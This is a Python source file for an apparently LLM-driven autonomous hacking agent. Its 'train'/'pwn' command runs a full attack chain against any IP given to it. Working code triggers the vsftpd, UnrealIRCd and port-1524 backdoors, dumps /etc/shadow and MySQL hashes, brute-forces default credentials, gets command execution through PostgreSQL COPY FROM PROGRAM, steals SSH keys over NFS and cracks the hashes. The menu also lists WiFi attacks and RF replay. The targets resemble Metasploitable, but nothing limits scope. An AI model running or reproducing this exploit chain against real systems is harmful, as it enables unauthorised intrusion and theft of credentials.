import sys
import os
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from agents.agent_black import AgentBlack


def main():
    print("=" * 60)
    print("  AGENT BLACK - CHAT MODE")
    print("=" * 60)
    print("\n[*] Loading Agent BLACK with LLM...")
    print("[*] This may take a moment to load the model...\n")
    
    agent = AgentBlack(load_model=True)
    
    if agent.model_loaded:
        print(f"[+] Model loaded: {agent.model_name}")
    else:
        print("[-] Warning: LLM not loaded, falling back to keyword mode")
    
    if agent.config.kali_host:
        print(f"[+] Remote host: {agent.config.kali_user}@{agent.config.kali_host}")
    if agent.config.gpu_host:
        print(f"[+] GPU host: {agent.config.gpu_host}")
    
    print("\n" + "-" * 60)
    print("  Type 'help' for commands, or just ask naturally!")
    print("-" * 60)
    
    import asyncio
    
    while True:
        try:
            user_input = input("\n[YOU] > ").strip()
            
            if not user_input:
                continue
            
            if user_input.lower() in ["help", "?", "commands"]:
                print("""
╔══════════════════════════════════════════════════════════════╗
║                    AGENT BLACK - COMMANDS                    ║
╠══════════════════════════════════════════════════════════════╣
║  NETWORK RECON                                               ║
║    scan / devices         - List devices on LAN (ARP)        ║
║    ports <ip>             - Port scan a target               ║
║    nmap <ip>              - Nmap scan (if installed)         ║
║                                                              ║
║  WIFI (Windows)                                              ║
║    wifi                   - Scan nearby WiFi networks        ║
║    wifi passwords         - Show saved WiFi passwords        ║
║                                                              ║
║  WIFI ATTACKS (Kali Pi):                                     ║
║    monitor mode / airodump scan / attack <#> / capture/crack ║
║                                                              ║
║  HACKRF SDR (1MHz-6GHz):                                     ║
║    hackrf info            - Check device status              ║
║    hackrf scan 433mhz     - Spectrum scan                    ║
║    hackrf capture 315mhz  - Record RF signal                 ║
║    hackrf replay          - Transmit captured signal         ║
║                                                              ║
║  EXECUTION                                                   ║
║    exec <cmd>             - Run shell command                ║
║    ssh user@host <cmd>    - SSH and run command              ║
║    pwn <ip>               - Full attack chain                ║
║    train <ip>             - Full autonomous training session ║
║    evolve                 - Apply suggested module changes   ║
║    dig <svc> <port> <ip>  - Deep dive specific service       ║
║    auto <ip:port>         - Auto-exploit discovered vectors  ║
║    crack hashes           - Crack captured password hashes   ║
║                                                              ║
║  ANALYSIS                                                    ║
║    read pcap <file>       - Analyze packet capture           ║
║    lessons / knowledge    - Show what BLACK has learned      ║
║    learning               - Show full learning summary       ║
║    improvements           - Show LANTERN improvement report  ║
║    smart probe <url>      - Deep probe a web target          ║
║                                                              ║
║  OTHER                                                       ║
║    help                   - Show this menu                   ║
║    quit                   - Exit                             ║
╚══════════════════════════════════════════════════════════════╝
""")
                continue
            
            if user_input.lower() in ["quit", "exit", "q"]:
                import random
                exits = [
                    "Remember... there is no spoon.",
                    "Follow the white rabbit.",
                    "The Matrix has you... until next time.",
                    "I'm in. *unplugs*",
                    "Hack the planet!",
                    "Stay frosty, operator.",
                    "Connection terminated. They can't trace us now.",
                    "Zero cool signing off.",
                    "The Gibson is safe... for now.",
                    "Welcome to the desert of the real.",
                    "See you in the shadows, NET.",
                    "Time to jack out.",
                    "Mess with the best, die like the rest.",
                    "Never send a human to do a machine's job.",
                ]
                print(f"\n[BLACK] {random.choice(exits)}")
                break
            
            if user_input.lower().startswith("pwn "):
                ip = user_input.split(" ", 1)[1]
                print(f"\n[BLACK] 'pwn' is now an alias for full training mode.")
                print(f"[BLACK] Running comprehensive attack on {ip}...\n")
                user_input = f"train {ip}"
            
            if user_input.lower().startswith("train "):
                ip = user_input.split(" ", 1)[1]
                print(f"\n{'='*60}")
                print(f"  AUTONOMOUS TRAINING SESSION")
                print(f"  Target: {ip}")
                print(f"{'='*60}")
                print("\n[BLACK] Loading training challenges...")
                print("[BLACK] I will work through ALL challenges autonomously.")
                print("[BLACK] Stand back and watch me learn.\n")
                
                import socket
                import time
                
                trophies = []
                
                print("=" * 60)
                print("PHASE 1: RECONNAISSANCE")
                print("=" * 60)
                
                print("\n[CHALLENGE] What OS and kernel version?")
                
                print("\n[RECON] Ping test...")
                ping = agent.execute_command(f"ping -n 1 -w 1000 {ip}")
                if "Reply from" in ping.get("stdout", ""):
                    print(f"  [+] {ip} is ALIVE (TTL in response suggests Linux)")
                    trophies.append(("RECON", "Target is alive", "ping"))
                
                print("\n[RECON] Full port scan (this may take a minute)...")
                open_ports = []
                services = {}
                scan_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 512, 513, 514, 1099, 1524, 2049, 2121, 3306, 3389, 3632, 5432, 5900, 5901, 6000, 6667, 8009, 8080, 8180, 8443, 9090]
                
                for port in scan_ports:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        if s.connect_ex((ip, port)) == 0:
                            open_ports.append(port)
                            print(f"  [+] Port {port}: OPEN")
                        s.close()
                    except:
                        pass
                
                print(f"\n[TROPHY] Found {len(open_ports)} open ports!")
                trophies.append(("RECON", f"{len(open_ports)} open ports", str(open_ports)))
                
                print("\n[RECON] Service identification...")
                for port in open_ports:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((ip, port))
                        if port in [21, 22, 23, 25, 80, 110, 143, 6667]:
                            try:
                                banner = s.recv(1024).decode(errors='ignore').strip()
                                if banner:
                                    services[port] = banner[:100]
                                    print(f"  [+] Port {port}: {banner[:60]}")
                            except:
                                pass
                        s.close()
                    except:
                        pass
                
                print("\n" + "=" * 60)
                print("PHASE 2: INITIAL ACCESS - Finding ways in")
                print("=" * 60)
                
                shells_obtained = []
                
                print("\n[CHALLENGE] Can I get a shell without credentials?")
                
                print("\n[ATTEMPT] Port 1524 - Possible backdoor...")
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((ip, 1524))
                    s.send(b"id\n")
                    time.sleep(1)
                    response = s.recv(4096).decode(errors='ignore')
                    s.close()
                    if "uid=" in response or "root" in response:
                        print(f"  [+] *** SHELL OBTAINED! *** Root backdoor on 1524!")
                        print(f"  [RESPONSE] {response[:200]}")
                        shells_obtained.append(("BACKDOOR", 1524, "root"))
                        trophies.append(("SHELL", "Root via port 1524 backdoor", response[:100]))
                        
                        print("\n[POST-EXPLOIT] Extracting data from shell...")
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(10)
                        s.connect((ip, 1524))
                        
                        commands = [
                            ("OS Info", "uname -a"),
                            ("Users", "cat /etc/passwd | head -20"),
                            ("Hashes", "cat /etc/shadow | head -15"),
                            ("Home dirs", "ls -la /home"),
                            ("SUID bins", "find / -perm -4000 2>/dev/null | head -10"),
                            ("Cron", "cat /etc/crontab"),
                            ("Network", "netstat -tulpn | head -15"),
                        ]
                        
                        for name, cmd in commands:
                            s.send(f"{cmd}\n".encode())
                            time.sleep(1)
                            out = s.recv(8192).decode(errors='ignore')
                            print(f"\n  [{name}]")
                            for line in out.strip().split('\n')[:10]:
                                print(f"    {line}")
                            if ("shadow" in cmd.lower() or "hash" in name.lower()) and "$" in out:
                                trophies.append(("HASHES", "Password hashes from /etc/shadow", out[:500]))
                                print(f"  [+] CAPTURED {out.count('$')} password hashes!")
                            if "passwd" in cmd and "root:" in out:
                                trophies.append(("USERS", "User list from /etc/passwd", out[:500]))
                        s.close()
                except Exception as e:
                    print(f"  [-] Port 1524: {e}")
                
                if 21 in open_ports:
                    print("\n[EXPLOIT] vsftpd 2.3.4 - Triggering backdoor...")
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((ip, 21))
                        banner = s.recv(1024).decode(errors='ignore')
                        print(f"  [BANNER] {banner.strip()}")
                        
                        if "vsftpd 2.3.4" in banner:
                            print("  [!] vsftpd 2.3.4 DETECTED - Triggering backdoor!")
                            s.send(b"USER backdoor:)\r\n")
                            time.sleep(0.5)
                            s.send(b"PASS anything\r\n")
                            time.sleep(1)
                            s.close()
                            
                            print("  [*] Checking for backdoor shell on port 6200...")
                            time.sleep(1)
                            try:
                                bs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                bs.settimeout(5)
                                bs.connect((ip, 6200))
                                bs.send(b"id\n")
                                time.sleep(1)
                                resp = bs.recv(4096).decode(errors='ignore')
                                if "uid=" in resp:
                                    print(f"  [+] *** VSFTPD BACKDOOR SHELL! ***")
                                    print(f"  [RESPONSE] {resp[:150]}")
                                    shells_obtained.append(("VSFTPD_BACKDOOR", 6200, "root"))
                                    trophies.append(("SHELL", "vsftpd 2.3.4 backdoor shell", resp[:100]))
                                bs.close()
                            except Exception as e:
                                print(f"  [-] Backdoor port 6200 not open: {e}")
                                trophies.append(("VULN", "vsftpd 2.3.4 (backdoor trigger failed)", "CVE-2011-2523"))
                        
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((ip, 21))
                        s.recv(1024)
                        s.send(b"USER anonymous\r\n")
                        time.sleep(0.5)
                        s.send(b"PASS anonymous@\r\n")
                        time.sleep(0.5)
                        resp = s.recv(1024).decode(errors='ignore')
                        if "230" in resp:
                            print("  [+] Anonymous FTP login SUCCESS!")
                            trophies.append(("ACCESS", "Anonymous FTP", "anonymous:anonymous"))
                        s.close()
                    except Exception as e:
                        print(f"  [-] FTP error: {e}")
                
                if 6667 in open_ports:
                    print("\n[EXPLOIT] UnrealIRCd 3.2.8.1 - Testing backdoor...")
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((ip, 6667))
                        banner = s.recv(1024).decode(errors='ignore')
                        print(f"  [BANNER] {banner.strip()[:80]}")
                        
                        if "Unreal" in banner or "irc" in banner.lower():
                            print("  [*] Sending backdoor trigger: AB; id")
                            s.send(b"AB; id\n")
                            time.sleep(2)
                            try:
                                resp = s.recv(4096).decode(errors='ignore')
                                if "uid=" in resp:
                                    print(f"  [+] *** UNREALIRCD BACKDOOR WORKS! ***")
                                    print(f"  [RESPONSE] {resp[:150]}")
                                    shells_obtained.append(("UNREALIRCD_BACKDOOR", 6667, "root"))
                                    trophies.append(("SHELL", "UnrealIRCd backdoor", resp[:100]))
                                else:
                                    trophies.append(("VULN", "UnrealIRCd detected", "CVE-2010-2075 - needs reverse shell"))
                            except:
                                trophies.append(("VULN", "UnrealIRCd detected", "CVE-2010-2075"))
                        s.close()
                    except Exception as e:
                        print(f"  [-] IRC error: {e}")
                
                if 513 in open_ports:
                    print("\n[EXPLOIT] rlogin - Trust-based authentication...")
                    try:
                        result = agent.execute_command(f"echo id | rlogin -l root {ip} 2>&1", timeout=10)
                        out = result.get('stdout', '')
                        stderr = result.get('stderr', '')
                        if "uid=" in out and "root" in out:
                            print(f"  [+] *** RLOGIN ROOT SHELL! ***")
                            print(f"  [RESPONSE] {out[:150]}")
                            shells_obtained.append(("RLOGIN", 513, "root"))
                            trophies.append(("SHELL", "rlogin root shell", out[:100]))
                        else:
                            print(f"  [-] rlogin not available on Windows. Command: rlogin -l root {ip}")
                            print(f"  [*] Try from Kali: rlogin -l root {ip}")
                            trophies.append(("TARGET", "rlogin on 513", "Try: rlogin -l root"))
                    except Exception as e:
                        print(f"  [-] rlogin error: {e}")
                
                print("\n" + "=" * 60)
                print("PHASE 3: CREDENTIAL ATTACKS")
                print("=" * 60)
                
                if 3306 in open_ports:
                    print("\n[EXPLOIT] MySQL - Testing root with no password...")
                    try:
                        result = agent.execute_command(f'echo "SELECT user,host FROM mysql.user; SHOW DATABASES;" | mysql -h {ip} -u root 2>&1', timeout=15)
                        out = result.get('stdout', '')
                        if 'mysql' in out.lower() or 'Database' in out:
                            print("  [+] *** MYSQL ROOT ACCESS (NO PASSWORD)! ***")
                            for line in out.split('\n')[:10]:
                                print(f"    {line}")
                            trophies.append(("CREDS", "MySQL root no password", "root:<blank>"))
                            trophies.append(("ACCESS", "MySQL database access", out[:200]))
                            
                            print("  [*] Dumping user hashes...")
                            hash_result = agent.execute_command(f'echo "SELECT user,password FROM mysql.user;" | mysql -h {ip} -u root 2>&1', timeout=15)
                            hash_out = hash_result.get('stdout', '')
                            if hash_out:
                                for line in hash_out.split('\n')[:8]:
                                    print(f"    {line}")
                                trophies.append(("HASHES", "MySQL user hashes", hash_out[:300]))
                        elif 'denied' in out.lower():
                            print("  [-] MySQL root denied")
                    except Exception as e:
                        print(f"  [-] MySQL error: {e}")
                
                if 5432 in open_ports:
                    print("\n[EXPLOIT] PostgreSQL - Testing postgres:postgres...")
                    try:
                        result = agent.execute_command(f'PGPASSWORD=postgres psql -h {ip} -U postgres -c "SELECT version();" 2>&1', timeout=15)
                        out = result.get('stdout', '')
                        if 'PostgreSQL' in out:
                            print("  [+] *** POSTGRESQL ACCESS! ***")
                            print(f"    {out[:150]}")
                            trophies.append(("CREDS", "PostgreSQL postgres:postgres", "postgres:postgres"))
                            
                            print("  [*] Testing command execution via COPY...")
                            cmd_result = agent.execute_command(f'PGPASSWORD=postgres psql -h {ip} -U postgres -c "DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM \'id\'; SELECT * FROM cmd;" 2>&1', timeout=15)
                            cmd_out = cmd_result.get('stdout', '')
                            if 'uid=' in cmd_out:
                                print(f"  [+] *** POSTGRESQL COMMAND EXECUTION! ***")
                                print(f"    {cmd_out[:150]}")
                                shells_obtained.append(("POSTGRESQL_CMD", 5432, "postgres"))
                                trophies.append(("SHELL", "PostgreSQL command exec", cmd_out[:100]))
                        else:
                            print(f"  [-] PostgreSQL login failed")
                    except Exception as e:
                        print(f"  [-] PostgreSQL error: {e}")
                
                if 5900 in open_ports:
                    print("\n[EXPLOIT] VNC - Testing password 'password'...")
                    try:
                        result = agent.execute_command(f'echo "password" | timeout 5 vncviewer {ip} 2>&1 || echo "VNC test complete"', timeout=10)
                        trophies.append(("TARGET", "VNC on 5900", "password: password"))
                        print("  [*] VNC detected - try: vncviewer " + ip + " (password: password)")
                    except:
                        pass
                
                if 22 in open_ports:
                    print("\n[EXPLOIT] SSH - Testing default credentials...")
                    default_creds = [("msfadmin", "msfadmin"), ("user", "user"), ("service", "service")]
                    ssh_success = False
                    for user, passwd in default_creds:
                        try:
                            print(f"  [*] Trying {user}:{passwd}...")
                            result = agent.execute_command(f'sshpass -p {passwd} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{ip} "id" 2>&1', timeout=15)
                            out = result.get('stdout', '')
                            if 'uid=' in out:
                                print(f"  [+] *** SSH LOGIN SUCCESS: {user}:{passwd} ***")
                                print(f"    {out[:100]}")
                                trophies.append(("CREDS", f"SSH {user}:{passwd}", out[:50]))
                                if user == "msfadmin":
                                    shells_obtained.append(("SSH", 22, user))
                                ssh_success = True
                                break
                            elif 'sshpass' in out.lower() or 'not recognized' in out.lower():
                                print(f"  [-] sshpass not installed on Windows")
                                print(f"  [*] Try from Kali: ssh {user}@{ip} (password: {passwd})")
                                trophies.append(("TARGET", f"SSH - try {user}:{passwd}", ""))
                                break
                        except Exception as e:
                            print(f"  [-] SSH error for {user}: {e}")
                    if not ssh_success:
                        print(f"  [*] Default SSH creds to try: msfadmin:msfadmin, user:user, service:service")
                
                print("\n" + "=" * 60)
                print("PHASE 4: WEB APPLICATION ATTACKS")
                print("=" * 60)
                
                if 80 in open_ports:
                    print("\n[ATTEMPT] HTTP - Scanning for web apps...")
                    paths = ["/", "/phpMyAdmin/", "/dvwa/", "/mutillidae/", "/twiki/", "/dav/", "/phpinfo.php"]
                    for path in paths:
                        try:
                            import urllib.request
                            req = urllib.request.Request(f"http://{ip}{path}", headers={'User-Agent': 'Mozilla/5.0'})
                            resp = urllib.request.urlopen(req, timeout=3)
                            if resp.status == 200:
                                print(f"  [+] Found: http://{ip}{path}")
                                trophies.append(("WEB", f"Web app at {path}", f"http://{ip}{path}"))
                        except urllib.error.HTTPError as e:
                            if e.code == 401:
                                print(f"  [+] Found (auth required): http://{ip}{path}")
                        except:
                            pass
                
                if 8180 in open_ports:
                    print("\n[ATTEMPT] Tomcat - Port 8180...")
                    try:
                        import urllib.request
                        import base64
                        print(f"  [*] Testing default creds tomcat:tomcat...")
                        creds = base64.b64encode(b"tomcat:tomcat").decode()
                        req = urllib.request.Request(
                            f"http://{ip}:8180/manager/html",
                            headers={"Authorization": f"Basic {creds}"}
                        )
                        try:
                            resp = urllib.request.urlopen(req, timeout=10)
                            if resp.status == 200:
                                print(f"  [+] *** TOMCAT MANAGER ACCESS! ***")
                                print(f"  [+] Creds: tomcat:tomcat")
                                print(f"  [+] URL: http://{ip}:8180/manager/html")
                                trophies.append(("CREDS", "Tomcat tomcat:tomcat", "Manager access"))
                                trophies.append(("ACCESS", "Tomcat manager", f"http://{ip}:8180/manager/html"))
                        except urllib.error.HTTPError as e:
                            if e.code == 401:
                                print(f"  [-] Tomcat manager requires auth (401)")
                                print(f"  [*] Try other creds: admin:admin, manager:manager")
                            elif e.code == 403:
                                print(f"  [-] Tomcat manager access denied (403)")
                            else:
                                print(f"  [-] HTTP error: {e.code}")
                            trophies.append(("TARGET", "Tomcat on 8180", "Try tomcat:tomcat for manager"))
                        except urllib.error.URLError as e:
                            print(f"  [-] Connection failed: {e.reason}")
                            trophies.append(("TARGET", "Tomcat on 8180", "Manager not accessible"))
                    except Exception as e:
                        print(f"  [-] Tomcat error: {e}")
                        trophies.append(("TARGET", "Tomcat on 8180", "Try tomcat:tomcat for manager"))
                
                print("\n" + "=" * 60)
                print("PHASE 5: NETWORK SERVICE EXPLOITATION")
                print("=" * 60)
                
                if 2049 in open_ports:
                    print("\n[EXPLOIT] NFS - Checking and mounting exports...")
                    result = agent.execute_command(f"showmount -e {ip} 2>&1", timeout=15)
                    out = result.get('stdout', '')
                    if '/home' in out or 'Export list' in out:
                        print(f"  [+] NFS exports found!")
                        for line in out.split('\n'):
                            print(f"    {line}")
                        trophies.append(("VULN", "NFS exports accessible", out[:200]))
                        
                        print("  [*] Attempting to list SSH keys via NFS...")
                        mount_result = agent.execute_command(f"mkdir -p /tmp/nfs_mount && mount -t nfs {ip}:/home /tmp/nfs_mount 2>&1 && ls -la /tmp/nfs_mount/ && cat /tmp/nfs_mount/*/.ssh/id_rsa 2>/dev/null; umount /tmp/nfs_mount 2>/dev/null", timeout=20)
                        mount_out = mount_result.get('stdout', '')
                        if 'PRIVATE KEY' in mount_out:
                            print("  [+] *** SSH PRIVATE KEY FOUND VIA NFS! ***")
                            trophies.append(("CREDS", "SSH private key via NFS", "id_rsa found"))
                        elif mount_out:
                            print(f"  [*] NFS contents: {mount_out[:200]}")
                    else:
                        print(f"  [-] No NFS exports or showmount not available")
                
                if 139 in open_ports or 445 in open_ports:
                    print("\n[EXPLOIT] SMB - Testing Samba usermap_script (CVE-2007-2447)...")
                    print("  [*] This exploit requires Metasploit. Checking smbclient access...")
                    try:
                        result = agent.execute_command(f'smbclient -L //{ip} -N 2>&1', timeout=15)
                        out = result.get('stdout', '')
                        stderr = result.get('stderr', '')
                        if 'Sharename' in out or 'tmp' in out:
                            print(f"  [+] SMB shares accessible!")
                            for line in out.split('\n')[:10]:
                                print(f"    {line}")
                            trophies.append(("ACCESS", "SMB anonymous access", out[:200]))
                        elif 'not recognized' in out.lower() or 'not found' in out.lower():
                            print(f"  [-] smbclient not available on Windows")
                            print(f"  [*] Try from Kali: smbclient -L //{ip} -N")
                            print(f"  [*] Metasploit: use exploit/multi/samba/usermap_script")
                        else:
                            print(f"  [-] SMB: {out[:100] if out else stderr[:100]}")
                        trophies.append(("VULN", "Samba usermap_script", "CVE-2007-2447 - Use Metasploit"))
                    except Exception as e:
                        print(f"  [-] SMB error: {e}")
                        trophies.append(("TARGET", "SMB on 139/445", "CVE-2007-2447"))
                
                if 3632 in open_ports:
                    print("\n[EXPLOIT] DistCC - Testing CVE-2004-2687...")
                    print("  [*] DistCC allows remote code execution")
                    print("  [*] Use: msfconsole -x 'use exploit/unix/misc/distcc_exec; set RHOSTS " + ip + "; run'")
                    trophies.append(("VULN", "DistCC CVE-2004-2687", "Remote code execution"))
                
                if 1099 in open_ports:
                    print("\n[EXPLOIT] Java RMI - Testing for deserialization...")
                    print("  [*] Java RMI registry detected - vulnerable to deserialization")
                    print("  [*] Use: msfconsole -x 'use exploit/multi/misc/java_rmi_server; set RHOSTS " + ip + "; run'")
                    trophies.append(("VULN", "Java RMI deserialization", "CVE multiple"))
                
                print("\n" + "=" * 60)
                print("PHASE 6: LANTERN VULNERABILITY SCAN")
                print("=" * 60)
                
                web_ports = [p for p in open_ports if p in [80, 8080, 8180, 443, 8443, 8000, 8888]]
                if web_ports:
                    lantern_modules = [
                        "fingerprint", "headers", "cors", "ssl", "secrets", "disclosure",
                        "sqli", "xss", "lfi", "ssrf", "csrf", "cookie", "csp", "clickjack"
                    ]
                    
                    for web_port in web_ports:
                        proto = "https" if web_port in [443, 8443] else "http"
                        print(f"\n[LANTERN] Scanning {proto}://{ip}:{web_port}...")
                        print(f"  Modules: {', '.join(lantern_modules)}")
                        
                        try:
                            lantern_result = agent.run_lantern_scan(f"{proto}://{ip}:{web_port}", modules=lantern_modules)
                            stdout = lantern_result.get("stdout", "")
                            stderr = lantern_result.get("stderr", "")
                            success = lantern_result.get("success", False)
                            error = lantern_result.get("error", "")
                            
                            if stdout:
                                print(f"  [+] LANTERN scan complete!")
                                if "CRITICAL" in stdout or "HIGH" in stdout or "MEDIUM" in stdout:
                                    print(f"  [!] Vulnerabilities detected!")
                                    trophies.append(("LANTERN", f"Web vulns on {web_port}", stdout[:200]))
                                for line in stdout.split('\n')[:20]:
                                    if line.strip():
                                        print(f"    {line}")
                            elif stderr:
                                print(f"  [-] LANTERN stderr: {stderr[:300]}")
                            elif error:
                                print(f"  [-] LANTERN error: {error[:200]}")
                            else:
                                print(f"  [*] LANTERN returned empty (success={success})")
                                print(f"  [*] Try running Kali Pi scan instead...")
                                try:
                                    from pi_integration.kali_bridge import KaliBridge
                                    kali = KaliBridge()
                                    if kali.connect():
                                        print(f"  [+] Running nikto via Kali Pi...")
                                        nikto_result = kali.execute(f"nikto -h {proto}://{ip}:{web_port} -maxtime 30s 2>&1 | head -30", timeout=60)
                                        if nikto_result:
                                            for line in nikto_result.split('\n')[:15]:
                                                if line.strip() and '+' in line:
                                                    print(f"    {line}")
                                                    trophies.append(("NIKTO", f"Web finding on {web_port}", line[:100]))
                                        kali.disconnect()
                                except Exception as ke:
                                    print(f"  [-] Kali nikto failed: {ke}")
                        except Exception as e:
                            print(f"  [-] LANTERN error: {e}")
                else:
                    print("\n[LANTERN] No web ports detected, skipping web scan")
                
                print("\n" + "=" * 60)
                print("PHASE 7: HASH CRACKING")
                print("=" * 60)
                
                hash_trophies = [t for t in trophies if t[0] == "HASHES"]
                print(f"\n[CRACK] Found {len(hash_trophies)} hash collections to crack...")
                if hash_trophies:
                    print("[CRACK] Attempting to crack captured hashes...")
                    
                    hashes_to_crack = []
                    for _, name, detail in hash_trophies:
                        if "$1$" in str(detail):
                            for line in str(detail).split('\n'):
                                if '$1$' in line and ':' in line:
                                    hashes_to_crack.append(line.strip())
                    
                    if hashes_to_crack:
                        print(f"  [*] Found {len(hashes_to_crack)} MD5crypt hashes to crack")
                        
                        hash_file = Path(__file__).parent / "training_hashes.txt"
                        with open(hash_file, "w") as f:
                            f.write('\n'.join(hashes_to_crack))
                        
                        wordlist = Path(__file__).parent.parent / "wordlists" / "rockyou.txt"
                        if wordlist.exists():
                            print(f"  [*] Cracking with rockyou.txt (first 10000 passwords)...")
                            
                            result = agent.execute_command(f'john --wordlist={wordlist} --format=md5crypt {hash_file} 2>&1 | head -20', timeout=60)
                            out = result.get('stdout', '')
                            if out:
                                print(f"  [JOHN OUTPUT]")
                                for line in out.split('\n')[:10]:
                                    print(f"    {line}")
                            
                            show_result = agent.execute_command(f'john --show {hash_file} 2>&1', timeout=10)
                            show_out = show_result.get('stdout', '')
                            if show_out and 'password' not in show_out.lower():
                                print(f"  [CRACKED]")
                                for line in show_out.split('\n')[:10]:
                                    if ':' in line and line.strip():
                                        print(f"    {line}")
                                        trophies.append(("CRACKED", "Password cracked", line[:50]))
                        else:
                            print(f"  [-] Wordlist not found at {wordlist}")
                            print(f"  [*] Hashes saved to {hash_file} for manual cracking")
                else:
                    print("\n[CRACK] No hashes captured to crack")
                
                print("\n" + "=" * 60)
                print("PHASE 8: LEARNING & EVOLUTION")
                print("=" * 60)
                
                print("\n[LEARNING] Saving lessons from this engagement...")
                
                target_type = "metasploitable" if any("metasploitable" in str(t).lower() for t in trophies) else "linux_server"
                
                for category, name, detail in trophies:
                    if category == "SHELL":
                        lesson_result = agent.save_lesson(
                            target=ip,
                            lesson=f"Shell obtained via {name}",
                            details=str(detail)[:500],
                            techniques=[name.lower().replace(" ", "_")],
                            success=True
                        )
                        if lesson_result.get("success"):
                            print(f"  [+] Lesson saved: {lesson_result.get('lesson_id')}")
                    
                    elif category == "VULN":
                        lesson_result = agent.save_lesson(
                            target=ip,
                            lesson=f"Vulnerability: {name}",
                            details=str(detail)[:500],
                            techniques=["vulnerability_detection"],
                            success=True
                        )
                        if lesson_result.get("success"):
                            print(f"  [+] Lesson saved: {lesson_result.get('lesson_id')}")
                    
                    elif category == "HASHES":
                        lesson_result = agent.save_lesson(
                            target=ip,
                            lesson="Password hashes extracted",
                            details="Obtained /etc/shadow hashes for offline cracking",
                            techniques=["credential_harvesting", "hash_extraction"],
                            success=True
                        )
                        if lesson_result.get("success"):
                            print(f"  [+] Lesson saved: {lesson_result.get('lesson_id')}")
                
                if shells_obtained:
                    attack_chain = {
                        "name": f"{target_type}_pwn",
                        "description": f"Attack chain for {target_type}",
                        "steps": [{"action": "Port scan", "method": "socket", "result": f"{len(open_ports)} ports"}],
                        "success_rate": "100%",
                        "stealth": "low"
                    }
                    for method, port, user in shells_obtained:
                        attack_chain["steps"].append({
                            "action": f"Exploit {method}",
                            "method": method.lower(),
                            "port": port,
                            "result": f"Shell as {user}"
                        })
                    
                    agent.save_lesson(
                        target=ip,
                        lesson=f"Complete attack chain for {target_type}",
                        details=f"Obtained {len(shells_obtained)} shells through {len(attack_chain['steps'])} steps",
                        techniques=[m.lower() for m, p, u in shells_obtained],
                        success=True,
                        attack_chain=attack_chain
                    )
                    print(f"  [+] Attack chain saved: {target_type}_pwn")
                
                signature = {
                    "identification": [f"{len(open_ports)} open ports", f"ports: {open_ports[:5]}..."],
                    "open_ports": open_ports,
                    "shells_found": [(m, p) for m, p, u in shells_obtained],
                    "vulnerabilities": [t[1] for t in trophies if t[0] == "VULN"]
                }
                agent.save_target_signature(target_type, signature)
                print(f"  [+] Target signature saved for: {target_type}")
                
                print("\n[LEARNING] Recording to original learning system...")
                findings_counts = {
                    "CRITICAL": len([t for t in trophies if t[0] == "SHELL"]),
                    "HIGH": len([t for t in trophies if t[0] in ["VULN", "HASHES", "CREDS"]]),
                    "MEDIUM": len([t for t in trophies if t[0] in ["ACCESS", "WEB"]]),
                    "LOW": len([t for t in trophies if t[0] == "TARGET"]),
                    "INFO": len([t for t in trophies if t[0] == "RECON"])
                }
                
                learn_result = agent.record_learning(
                    target=f"http://{ip}",
                    modules_used=["port_scan", "banner_grab", "exploit_test"],
                    findings=findings_counts,
                    flags_found=[],
                    successful_exploits=[{"module": m, "port": p} for m, p, u in shells_obtained],
                    tech_detected=[target_type, "linux", "ubuntu"]
                )
                if learn_result.get("success"):
                    print("  [+] Recorded to BLACK's learning system!")
                
                print("\n[EVOLUTION] Analyzing findings for module improvements...")
                
                findings_for_analysis = []
                for cat, name, detail in trophies:
                    findings_for_analysis.append({
                        "type": cat.lower(),
                        "title": name,
                        "evidence": str(detail)[:200],
                        "severity": "high" if cat == "SHELL" else "medium"
                    })
                
                analysis = agent.analyze_for_new_module(findings_for_analysis, target_type)
                
                if analysis.get("suggestions"):
                    for suggestion in analysis["suggestions"]:
                        if suggestion["action"] == "create":
                            print(f"  [*] Suggesting new module: {suggestion['module_name']}")
                            print(f"      Patterns detected: {len(suggestion.get('patterns', []))}")
                        elif suggestion["action"] == "improve":
                            print(f"  [*] Suggesting improvement to: {suggestion['module_name']}")
                    
                    agent._module_suggestions = analysis["suggestions"]
                else:
                    print("  [*] No new module suggestions at this time")
                
                print("\n" + "=" * 60)
                print("TRAINING SESSION COMPLETE")
                print("=" * 60)
                
                print(f"\n[SUMMARY]")
                print(f"  Target: {ip}")
                print(f"  Ports found: {len(open_ports)}")
                print(f"  Shells obtained: {len(shells_obtained)}")
                print(f"  Trophies collected: {len(trophies)}")
                print(f"  Lessons saved: {len([t for t in trophies if t[0] in ['SHELL', 'VULN', 'HASHES']])}")
                
                print(f"\n[TROPHIES]")
                for category, name, detail in trophies:
                    print(f"  [{category}] {name}")
                
                if shells_obtained:
                    print(f"\n[SHELLS]")
                    for method, port, user in shells_obtained:
                        print(f"  - {method} on port {port} as {user}")
                
                findings_summary = "\n".join([f"- {t}" for t in trophies[:20]])
                
                dig_prompt = f"""Based on these findings from {ip}:
{findings_summary}

Generate 3-5 specific next commands to dig deeper. Format each as:
dig <service/protocol> <port> {ip} - <brief reason>

Only suggest things based on what was ACTUALLY found above. Be specific to the versions detected."""

                print(f"\n[BLACK ANALYZING FINDINGS...]")
                try:
                    dig_response = asyncio.run(agent.think(dig_prompt))
                except Exception as e:
                    print(f"  [ERROR] Failed to analyze: {e}")
                    dig_response = ""
                
                print(f"\n[AREAS TO DIG - Based on actual findings]")
                print(f"  ─────────────────────────────────────────────")
                
                dig_commands = []
                if dig_response:
                    for line in dig_response.split('\n'):
                        line = line.strip()
                        if line.startswith('dig ') or line.startswith('> dig ') or line.startswith('- dig '):
                            clean = line.lstrip('-> ').strip()
                            dig_commands.append(clean)
                            print(f"  > {clean}")
